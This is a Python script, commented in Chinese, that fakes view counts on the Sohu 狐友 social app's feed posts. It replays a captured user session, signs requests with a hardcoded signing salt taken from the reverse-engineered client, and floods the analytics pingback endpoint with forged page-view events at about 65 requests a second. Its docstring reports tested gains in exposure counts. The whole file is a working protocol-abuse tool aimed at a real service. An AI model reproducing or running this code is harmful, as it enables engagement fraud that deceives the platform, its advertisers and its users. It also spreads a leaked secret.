#!/usr/bin/env python3
"""狐友 exposureCount 纯协议加压器（无需设备、无 UI）。

原理链（全部已验证）：
  1) 曝光由客户端埋点事件驱动：P_FEED_DETAIL（E_PAGE_VIEW / PageEnum=2）
  2) 上报通道：POST https://opapi-ol.sns.sohu.com/openapi/pingback/log/report
     body = multipart/form-data，单 part：name="message" filename="message"
            内容 = varint 长度前缀 + Log(SwiftProtobuf) 消息
  3) 请求签名：sig = MD5( sorted(k=v 拼接) + "C01N6rm43032SV00" )，覆盖 body 无关、
     但覆盖 query 参数与 5 个 header（S-CID / S-PID / S-PPID / S-VS / s-nonce）
  4) s-nonce = base64url( 8字节大端毫秒时间戳 + 40字节 SecRandomCopyBytes 随机 )

实测吞吐（2026-11-01）：
  100 条 / 1.8 s  -> +202 曝光
  250 条 / 3.8 s  -> +510 曝光
  即约 65 条/秒、约 134 次曝光/秒（服务端约 30-100 s 批量 flush 后才体现在接口值上）

用法：
  python3 boost_protocol.py --feed <feedId> --count 250 --workers 32
  python3 boost_protocol.py --feed <feedId> --count 500 --workers 32 --verify
"""

import argparse
import base64
import http.client
import json
import os
import re
import secrets
import struct
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent / 'sig_reverse'))
import payload as P                     # noqa: E402
from sign import sign                   # noqa: E402

REPORT_HOST = 'opapi-ol.sns.sohu.com'
REPORT_PATH = '/openapi/pingback/log/report'
SHOW_HOST = 'cs-ol.sns.sohu.com'
SHOW_PATH = '/330000/v7/feeds/show'


def gen_nonce(ts_ms=None):
    """s-nonce = base64url( 8字节大端毫秒时间戳 + 40字节随机 )，去掉尾部 '='。"""
    ts = int(ts_ms if ts_ms is not None else time.time() * 1000)
    raw = struct.pack('>Q', ts) + os.urandom(40)
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode('ascii')


class Session:
    """一个真实抓包样本提供身份与固定 header（S-CID / S-PID / S-PPID / token 等）。"""

    def __init__(self, dump_path):
        d = json.load(open(dump_path))
        self.session_path = str(__import__('pathlib').Path(dump_path).resolve())
        self.headers = {k: v for k, v in d['headers'].items()
                        if k.lower() not in ('connection', 'accept-encoding', 'content-length')
                        and v.isascii()}
        self.show_body = dict(x.split('=', 1) for x in d['body'].split('&'))
        self.show_body.pop('sig', None)
        self.user_id = self.show_body.get('log_user_id')
        self.device_id = self.headers.get('S-CID') or self.headers.get('gid')
        self.session_id = self.headers.get('gid') or self.headers.get('S-CID')
        self.passport = self.headers.get('S-PPID', '')
        self.fresh_nonce = True      # 每次请求生成新 nonce（旧 nonce 有时效校验）

    def _refresh_nonce(self):
        """生成新鲜 s-nonce 并写回 headers（签名会随之重算）。"""
        if not self.fresh_nonce:
            return
        try:
            self.headers['s-nonce'] = gen_nonce()
        except Exception:  # noqa: BLE001
            pass

    def log_message(self, feed_id, ts_ms):
        public = {
            'deviceId': self.device_id, 'sessionId': self.session_id,
            'userId': self.user_id, 'passportId': self.passport,
            'version': '6.24.1', 'os': 'O_IOS',
            'createTime': ts_ms, 'submitTime': ts_ms,
            'channelId': 'share_M10000063',
        }
        return P.build_feed_detail(feed_id=feed_id, public_meta=public)

    def multipart(self, raw):
        boundary = 'alamofire.boundary.%08x%08x' % (secrets.randbits(32), secrets.randbits(32))
        head = (f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="message"; filename="message"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n').encode()
        return boundary, head + raw + f'\r\n--{boundary}--\r\n'.encode()

    def report_once(self, feed_id, ts_ms):
        raw = self.log_message(feed_id, ts_ms)
        boundary, body = self.multipart(raw)
        q = {'app_key_vs': '6.24.1', 'appid': '330000', 'flyer': str(ts_ms)}
        headers = dict(self.headers)
        headers['s-nonce'] = gen_nonce()
        q['sig'] = sign(q, headers)
        hdrs = dict(headers)          # 复用带 nonce 的副本，避免与签名不一致
        hdrs['Content-Type'] = f'multipart/form-data; boundary={boundary}'
        hdrs['Content-Length'] = str(len(body))
        try:
            conn = http.client.HTTPSConnection(REPORT_HOST, timeout=12)
            conn.request('POST', REPORT_PATH + '?' + urllib.parse.urlencode(q), body=body, headers=hdrs)
            resp = conn.getresponse()
            resp.read()
            conn.close()
            return resp.status
        except Exception as exc:  # noqa: BLE001
            return f'ERR {exc.__class__.__name__}'

    def read_count(self, feed_id):
        params = dict(self.show_body)
        params['feed_id'] = feed_id
        params['flyer'] = str(int(time.time() * 1000))
        headers = dict(self.headers)
        headers['s-nonce'] = gen_nonce()
        params['sig'] = sign(params, headers)
        body = '&'.join(f'{k}={v}' for k, v in params.items()).encode()
        try:
            conn = http.client.HTTPSConnection(SHOW_HOST, timeout=8)
            conn.request('POST', SHOW_PATH, body=body, headers=headers)
            text = conn.getresponse().read().decode('utf-8', 'replace')
            conn.close()
            hit = re.search(r'"exposureCount":(\d+)', text)
            return int(hit.group(1)) if hit else None
        except Exception:  # noqa: BLE001
            return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--feed', required=True, help='目标 feedId')
    ap.add_argument('--count', type=int, default=250, help='发送条数（每条约 +2 曝光）')
    ap.add_argument('--workers', type=int, default=32)
    ap.add_argument('--dump', default=str(HERE / 'session_sample.json'),
                    help='真实抓包样本（提供身份与固定 header）')
    ap.add_argument('--verify', action='store_true', help='发完等待 flush 并核对计数')
    ap.add_argument('--wait', type=int, default=100, help='--verify 时等待秒数')
    args = ap.parse_args()

    session = Session(args.dump)
    before = session.read_count(args.feed) if args.verify else None
    print(f'目标 feed={args.feed}  条数={args.count}  并发={args.workers}'
          + (f'  起始曝光={before}' if before is not None else ''))

    base = int(time.time() * 1000)
    started = time.time()
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        results = list(pool.map(lambda i: session.report_once(args.feed, base + i),
                                range(args.count)))
    elapsed = time.time() - started

    codes = {}
    for code in results:
        codes[code] = codes.get(code, 0) + 1
    print(f'发送完成：{elapsed:.1f}s  状态={codes}  吞吐={args.count/elapsed:.1f} 条/秒')

    if args.verify:
        print(f'等待 {args.wait}s 让服务端 flush…')
        time.sleep(args.wait)
        after = session.read_count(args.feed)
        if before is not None and after is not None:
            delta = after - before
            print(f'曝光：{before} -> {after}  (+{delta})')
            print(f'实际倍率：每条 {delta/max(args.count,1):.2f} 次曝光；'
                  f'等效 {delta/elapsed:.1f} 次曝光/秒')


if __name__ == '__main__':
    main()
